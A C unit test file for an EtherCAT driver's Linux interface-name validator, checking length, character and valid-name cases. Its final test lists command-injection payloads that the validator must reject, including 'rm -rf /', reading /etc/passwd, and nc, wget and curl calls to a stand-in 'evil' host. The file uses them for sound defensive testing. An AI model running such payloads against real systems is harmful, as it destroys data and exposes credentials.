/**
 * @file test_ethercat_iface_validator.c
 * @brief Unit tests for ecat_is_valid_iface_name() — the Linux iface
 *        whitelist used as a precondition before passing names to
 *        ethtool / iptables / /proc paths.
 *
 * Accepted: alphanumeric + '_' + '-', must start with an alpha,
 *           length 1..15 (IFNAMSIZ-1).
 */

#include "ethercat_config.h"
#include "unity.h"

#include <stddef.h>
#include <stdio.h>

TEST_SOURCE_FILE("core/src/drivers/plugins/native/ethercat/cjson/cJSON.c")

void setUp(void) {}
void tearDown(void) {}

/* ---- Null and length boundaries ---- */

void test_iface_validator_Null_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name(NULL));
}

void test_iface_validator_Empty_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name(""));
}

void test_iface_validator_MaxValidLength_ShouldAccept(void)
{
    /* 15 chars = IFNAMSIZ-1, the longest valid Linux iface name. */
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("eth012345678901"));
}

void test_iface_validator_LengthSixteen_ShouldReject(void)
{
    /* 16 chars: leaves no room for the NUL within IFNAMSIZ. */
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0123456789012"));
}

void test_iface_validator_VeryLong_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name(
        "this_is_a_ridiculously_long_interface_name_that_cannot_exist"));
}

/* ---- First-character constraint ---- */

void test_iface_validator_LeadingDigit_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("0eth"));
}

void test_iface_validator_LeadingUnderscore_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("_eth0"));
}

void test_iface_validator_LeadingHyphen_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("-eth0"));
}

/* ---- Shell metacharacters and unsafe characters ---- */

void test_iface_validator_Semicolon_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0;rm"));
}

void test_iface_validator_Pipe_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0|cat"));
}

void test_iface_validator_Backtick_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0`id`"));
}

void test_iface_validator_Dollar_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0$x"));
}

void test_iface_validator_Slash_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0/foo"));
}

void test_iface_validator_Backslash_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0\\x"));
}

void test_iface_validator_Space_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth 0"));
}

void test_iface_validator_Newline_ShouldReject(void)
{
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("eth0\n"));
}

void test_iface_validator_DotInName_ShouldReject(void)
{
    /* '.' is not in the accepted set even though some virtual ifaces use it.
     * Keeping the validator strict avoids surprises elsewhere. */
    TEST_ASSERT_FALSE(ecat_is_valid_iface_name("vlan0.10"));
}

/* ---- Valid Linux iface names ---- */

void test_iface_validator_SimpleEth0_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("eth0"));
}

void test_iface_validator_PredictableEnp_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("enp3s0"));
}

void test_iface_validator_Wireless_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("wlan0"));
}

void test_iface_validator_Loopback_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("lo"));
}

void test_iface_validator_Underscore_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("ec_master"));
}

void test_iface_validator_Hyphen_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("eth-net"));
}

void test_iface_validator_MixedCase_ShouldAccept(void)
{
    TEST_ASSERT_TRUE(ecat_is_valid_iface_name("Eth0"));
}

/* ---- Security regression: documented command-injection payloads ---- */

void test_iface_validator_CommandInjectionPayloads_ShouldReject(void)
{
    /* Real-world payloads collected from common command-injection
     * cheatsheets. Per-character classes are already covered above; this
     * test serves as a documented security regression and a single place
     * to add new payloads that show up in audits. */
    static const char *payloads[] = {
        "eth0; cat /etc/passwd",
        "eth0;rm -rf /",
        "$(id)",
        "eth0$(whoami)",
        "`id`",
        "eth0`whoami`",
        "eth0|nc evil 1337",
        "eth0 && wget evil.example/x",
        "eth0||curl evil.example",
        "eth0\nrm -rf /",
        "eth0\r\nGET / HTTP/1.0",
        "eth0 ../../etc/passwd",
        "eth0/../../tmp",
        "eth0\\..\\..\\windows",
        "eth0 'OR 1=1 --",
        "eth0\"; DROP TABLE x; --",
    };

    for (size_t i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        char message[160];
        snprintf(message, sizeof(message),
                 "payload #%zu must be rejected: %s", i, payloads[i]);
        TEST_ASSERT_FALSE_MESSAGE(ecat_is_valid_iface_name(payloads[i]), message);
    }
}
